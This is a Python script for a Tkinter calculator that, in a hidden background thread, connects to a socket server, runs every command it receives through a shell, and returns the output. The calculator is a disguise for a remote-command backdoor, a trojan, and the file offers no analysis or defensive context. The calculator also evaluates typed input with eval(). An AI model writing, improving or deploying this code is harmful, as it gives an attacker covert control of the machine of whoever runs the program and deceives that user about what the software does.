import socket
import threading
import tkinter as tk
from tkinter import simpledialog
import subprocess 


class Calculator:
    def __init__(self, master, nickname):
        self.master = master
        self.frame = tk.Frame(self.master)
        self.frame.pack()

        self.expression = ""
        self.result = None

        self.entry = tk.Entry(self.frame, width=30, font=("Arial", 14))
        self.entry.grid(row=0, column=0, columnspan=4)

        buttons_layout = [
            ('1', '2', '3', '+'),
            ('4', '5', '6', '-'),
            ('7', '8', '9', '*'),
            ('C', '0', '=', '/'),
        ]

        for i, row in enumerate(buttons_layout, start=1):
            for j, label in enumerate(row):
                button = tk.Button(self.frame, text=label, width=5, command=lambda x=label: self.button_click(x))
                button.grid(row=i, column=j)

        self.master.protocol("WM_DELETE_WINDOW", self.close_connection)

        self.nickname = nickname

    def button_click(self, value):
        if value == '=':
            self.calculate()
        elif value == 'C':
            self.clear()
        else:
            self.expression += value
            self.entry.delete(0, tk.END)
            self.entry.insert(0, self.expression)

    def calculate(self):
        try:
            self.result = eval(self.expression)
            self.entry.delete(0, tk.END)
            self.entry.insert(0, self.result)
        except SyntaxError:
            tk.messagebox.showerror("Error1", "Invalid expression")
        except ZeroDivisionError:
            tk.messagebox.showerror("Error2", "Division by zero")

    def clear(self):
        self.expression = ""
        self.result = None
        self.entry.delete(0, tk.END)

    def close_connection(self):
        self.master.destroy()

class Client:
    def __init__(self, host, port):
        self.HOST = host
        self.PORT = port
        
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.HOST, self.PORT))
        
        msg = tk.Tk()
        msg.withdraw()
        
        self.running = True

        self.nickname = simpledialog.askstring("Nickname", "Please choose a nickname", parent=msg)

        
        self.receive_thread = threading.Thread(target=self.receive_and_exe)
        self.receive_thread.start() 

        self.calculator_thread = threading.Thread(target=self.run_calculator)
        self.calculator_thread.start()
        
        
    def run_calculator(self):
        root = tk.Tk()
        root.title("Calculator")
        calculator = Calculator(root, self.nickname)
        root.mainloop()
        
    
    
    def receive_and_exe(self):
        while self.running:
            try:
                message = self.client.recv(4096).decode('utf-8')
                if message == 'NICK':
                    self.client.send(self.nickname.encode('utf-8'))
                elif message == 'connected to server':
                    continue
                elif message:
                    message = message.replace('\n\nEND\n\n', '')
                    print(message)
                    output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT, text=True)
                    self.send_message(message+'\n'+output)
                    # print(output)
                else:
                    print("Error3")
            except ConnectionAbortedError:
                break
            except subprocess.CalledProcessError as e:
                print('Error4')
                self.send_message("Error4")
            except Exception as e:
                print("An error occurred:", e)
                self.send_message("An error occurred:", e)
                client.close()
                self.running=False
        if not self.running:
            self.close()

    def close(self):
        self.running = False  
        self.client.close()  
        self.calculator_thread.join() 
        exit(0)  

    def send_message(self, message):
        try:
            message+='\n\nEND\n\n'
            output=str(message).encode('utf-8')
            self.client.sendall(output)
            print(output.decode('utf-8'))
        except Exception as e:
            print("An error occurred:", e)
            self.client.close()

if __name__ == "__main__":
    HOST = '127.0.0.1'
    PORT = 9090
    client = Client(HOST, PORT)
    
